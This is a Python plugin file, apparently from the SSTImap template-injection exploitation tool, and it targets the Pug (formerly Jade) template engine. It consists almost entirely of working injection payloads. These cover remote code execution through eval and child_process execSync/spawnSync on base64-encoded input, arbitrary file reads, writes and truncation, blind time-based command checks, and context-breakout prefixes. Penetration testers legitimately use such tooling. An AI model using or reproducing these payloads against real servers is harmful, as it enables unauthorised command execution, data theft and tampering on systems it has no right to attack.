from plugins.languages import javascript
from utils import rand


class Pug(javascript.Javascript):
    generic_plugin = True
    priority = 5
    plugin_info = {
        "Description": 'Pug 模板引擎以前称为 Jade',
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # 原始 Tplmap 载荷
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # SSTImap 更新
        ],
        "Engine": [
            "Homepage: https://pugjs.org/",
            "Github: https://github.com/pugjs/pug",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'call': 'inject',
                'render': '{code}',
                'header': '\n= {header[0]}+{header[1]}\n',
                'trailer': '\n= {trailer[0]}+{trailer[1]}\n',
                'test_render': f'|#{{typeof({rand.randints[0]})+{rand.randints[1]}}}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'render_error': {
                'header': """\n= ''['x'][({header[0]}+{header[1]}).toString()+""",
                'trailer': """+({trailer[0]}+{trailer[1]}).toString()]\n""",
            },
            'evaluate': {
                'evaluate': """= eval(Buffer('{code_b64p}', 'base64').toString())""",
                'test_os': """global.process.mainModule.require('os').platform()"""
            },
            'evaluate_error': {
                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())"""
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """0\n- x = [""]\n- x[0+!eval(Buffer('{code_b64p}', 'base64').toString())]["length"]\n"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """0\n- eval(Buffer('{code_b64p}', 'base64').toString())&&global.process.mainModule.require('child_process').execSync('sleep {delay}')\n"""
            },
            'execute': {
                'call': 'render',
                'execute': """= global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
            },
            'execute_error': {
                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
            },
            'execute_boolean': {
                'call': 'evaluate_blind',
                # spawnSync() shell 选项已在 Node 5.7 中引入，因此这不适用于旧的 Node 版本。
                # TODO：使用另一个函数。
                'execute_blind': """global.process.mainModule.require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
            },
            # 此处不使用执行，因为它已渲染并且需要设置标题和预告片
            'execute_blind': {
                'call': 'inject',
                # execSync() 已在 Node 0.11 中引入，因此这不适用于旧的 Node 版本。
                # TODO：使用另一个函数。
                # 调用注入的载荷必须以 \n 开头以打破已经开始的行
                # 这是两行命令，以避免 Javascript 模块误报
                'execute_blind': """\n- x = global.process.mainModule.require\n- x('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')\n"""
            },
            # 这里没有evaluate_blind，因为我们没有睡眠，所以我们将使用inject
            'write': {
                'call': 'inject',
                # 调用注入的载荷必须以 \n 开头以打破已经开始的行
                'write': """\n- global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')\n""",
                'truncate': """\n- global.process.mainModule.require('fs').writeFileSync('{path}', '')\n"""
            },
            'read': {
                'call': 'render',
                'read': """= global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
            },
            'read_error': {
                'read': """global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
            },
            'md5': {
                'call': 'render',
                'md5': """= global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
            },
            'md5_error': {
                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
            },
            'md5_blind': {
                'call': 'evaluate_blind',
                'md5_blind': "global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest('hex')=='{md5}'",
                'exists_blind': "global.process.mainModule.require('fs').existsSync('{path}')"
            },
        })

        self.set_contexts([
            # 文本上下文，无闭包
            {'level': 0},
            # 属性关闭 a(href=\'%s\')
            {'level': 1, 'prefix': '{closure})', 'suffix': '//', 'closures': {1: javascript.ctx_closures[1]}},
            # 字符串插值#{
            {'level': 2, 'prefix': '{closure}}}', 'suffix': '//', 'closures': javascript.ctx_closures},
            # 代码上下文
            {'level': 2, 'prefix': '{closure}\n', 'suffix': '//', 'closures': javascript.ctx_closures},
        ])

    language = 'javascript'
